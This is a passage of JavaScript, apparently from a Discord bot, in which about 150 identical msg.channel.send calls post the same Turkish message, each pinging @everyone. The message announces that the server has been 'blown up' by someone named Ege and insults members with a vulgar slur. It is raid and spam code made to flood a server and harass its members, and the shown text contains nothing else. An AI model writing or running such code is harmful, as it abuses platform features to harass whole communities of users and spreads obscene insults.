      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
